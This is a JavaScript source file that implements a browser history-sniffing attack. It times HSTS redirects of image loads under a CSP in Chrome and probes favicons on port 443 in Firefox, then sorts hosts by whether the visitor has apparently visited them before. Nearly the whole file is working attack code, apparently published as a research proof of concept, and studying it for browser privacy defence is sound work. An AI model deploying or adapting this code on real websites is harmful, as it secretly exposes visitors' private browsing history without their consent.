/**
 * @fileoverview This file loads a bunch of HSTS domains and times how long it
 * takes for them to be redirected from HTTP to HTTPS. Based on that, it
 * decides whether the domain is a previously-noted HSTS domain or not in
 * Chrome. In Firefox, simply use crbug436451 to tell whether the domain is in
 * HSTS by looking at the onload/onerror events.
 * @author yan <yan@mit.edu>
 * @license MIT
 * @version 0.3.0
 */

// Timing in milliseconds above which a network request probably occurred.
// TODO: Determine this dynamically from the distribution of response times.
var TIMING_UPPER_THRESHOLD = 5
// Timing in milliseconds below which a request time is probably a measurement
// fluke.
var TIMING_LOWER_THRESHOLD = -10
// Timing allowance for a synchronous image load, which we use to confirm
// positive results in Chrome.
var TIMING_CONFIRM_THRESHOLD = 20

// Use an arbitrary static preloaded HSTS host for timing calibration
var BENCHMARK_HOST = 'http://torproject.org/'
// Initial timing calibration offset. This gets recalculated every other fetch.
var OFFSET = 0

var visitedElem = document.getElementById('visited')
var notVisitedElem = document.getElementById('not_visited')
var disclaimer = document.getElementById('disclaimer')
var isFirefox = (window.navigator.userAgent.indexOf('Firefox') !== -1)
var visited = [] // list of hosts that are potentially visited

/**
 * Gets hostname from URL.
 * @param {string} url
 */
function getHost_ (url) {
  return url.replace('http://', '').split(/\/|\?/)[0]
}

/**
 * Gets favicon on port 443 URL from URL.
 * @param {string} url
 */
function getFaviconPort443_ (url) {
  var host = url.split('/')[2]
  return 'http://' + host + ':443/favicon.ico'
}

/**
 * Our CSP policy (HTTP-only images) causes this to fire whenever the img src
 * redirects to HTTPS, either by HSTS (307) or plain old redirects (301/302).
 * @param {number} start Time when the image load started
 * @param {string} host The host that fired the error
 * @private
 */
function onImgErrorChrome_ (start, host) {
  var time = new Date().getTime() - start
  if (host === BENCHMARK_HOST) {
    // This is just a calibration measurement so update the offset time.
    OFFSET = time
  } else {
    // We need to subtract offset, otherwise hosts that are further down on the
    // page seem to have higher load times because of the time that it took for
    // the DOM to load.
    displayChrome(host, time - OFFSET, OFFSET)
  }
}

/**
 * Double-check whether hosts have been visited by trying synchronous image
 * loads, which have cleaner timing profiles. I find this helps reduce the
 * false positive rate in Chrome. AFAICT, the async image-load sniffing method
 * works great in Firefox so this isn't necessary there.
 * @param {function(string, number)} callback Gets called when img error fires.
 * @param {function()} finished Called when all loads are done.
 * @private
 */
function confirmVisitedChrome_ (callback, finished) {
  var initial // initial time
  var img = new Image()
  var timeouts = [] // array of timeout IDs
  var hostsDone = []
  var dummySrc = 'http://example.com/' // URL for timer initialization
  function clearTimeouts_ () {
    // Clear existing timeouts
    timeouts.forEach(function (id) {
      window.clearTimeout(id)
    })
    timeouts = []
  }
  function doNext_ () {
    if (visited.length === 0) {
      finished()
      return
    }
    // Shift instead of pop since we are pushing hosts into the array while
    // this is running
    var host = visited.shift()
    initial = new Date().getTime()
    var src = 'http://' + host + '/?' + initial.toString()
    img.src = src
    // Abort after 20ms since positive results should take less time anyway
    timeouts.push(window.setTimeout(img.onerror.bind({src: src}),
                                    TIMING_CONFIRM_THRESHOLD))
  }
  img.onerror = function () {
    if (this.src !== dummySrc) {
      clearTimeouts_()
      var host = getHost_(this.src)
      if (hostsDone.indexOf(host) !== -1) {
        // We might have called the callback for this host already.
        console.log('already done, skipping', host)
      } else {
        hostsDone.push(host)
        callback(host, new Date().getTime() - initial)
      }
    } else {
      console.log('initialized timer using', this.src)
    }
    doNext_()
  }
  img.onload = function () {
    // Should never happen but add a callback in case so it doesn't block the
    // rest of the image requests from being sent.
    console.log('UNEXPECTEDLY LOADED', this.src)
    doNext_()
  }
  // Set the image source initially to a dummy URL b/c the first load seems to
  // always take a long time no matter what.
  img.src = 'http://example.com/'
}

/**
 * Times how long a request takes by loading it as an img src and waiting for
 * the error to fire. I would use XHR here but it turns out CORS errors fire
 * before CSP.
 * @param {string} host
 */
function timeRequestChrome_ (host) {
  var img = new Image()
  img.onerror = onImgErrorChrome_.bind(this, new Date().getTime(), host)
  // Add random params so we don't hit the cache
  img.src = host + '?' + Math.random().toString().substring(2)
}

/**
 * Measures the calibration drift so we have a better estimate of how long
 * a resource fetch actually took. Since we expect the time T to fetch a
 * preloaded STS host to be ~constant, the fact that it changes indicates
 * that our timing is getting skewed by some amount, probably due to DOM
 * processing. Correct for the skew by subtracting T from measurements that
 * happen shortly after.
 */
function calibrateTimeChrome_ () {
  timeRequestChrome_(BENCHMARK_HOST)
}

/**
 * Display the results for Chrome.
 * @param {string} url
 * @param {number} time
 */
function displayChrome (url, time) {
  var li = document.createElement('li')
  var host = getHost_(url)
  li.id = host
  li.appendChild(document.createTextNode(host))
  if (time < TIMING_UPPER_THRESHOLD && time > TIMING_LOWER_THRESHOLD) {
    // If we are in Chrome, hide the results for now because the false
    // positive rate is really high until confirmVisited_() is called.
    li.style.color = 'lightgray'
    visitedElem.appendChild(li)
    visited.push(host)
  } else {
    notVisitedElem.appendChild(li)
  }
}

/**
 * Display the results for Firefox.
 * @param {string} url The url to display
 * @param {boolean} visited Whether the site was visited
 */
function displayFirefox (url, visited) {
  var li = document.createElement('li')
  var host = url.replace('http://', '').replace(':443', '').split('/')[0]
  li.id = host
  li.appendChild(document.createTextNode(host))
  if (visited) {
    visitedElem.appendChild(li)
  } else {
    notVisitedElem.appendChild(li)
  }
}

window.HOSTS.forEach(function (url) {
  if (window.BLACKLIST_HOSTS.includes(url)) {
    return
  }
  for (var i = 0; i < window.IGNORE_HOSTS.length; i++) {
    let host = window.IGNORE_HOSTS[i]
    if (url.includes(host)) {
      return
    }
  }
  // This method is slow, but it works even with newer Firefoxes that have
  // fixed the original sniffly attack.
  url = getFaviconPort443_(url)
  var img = new Image()
  img.onerror = displayFirefox.bind(this, url, false)
  img.onload = displayFirefox.bind(this, url, true)
  img.src = url
})
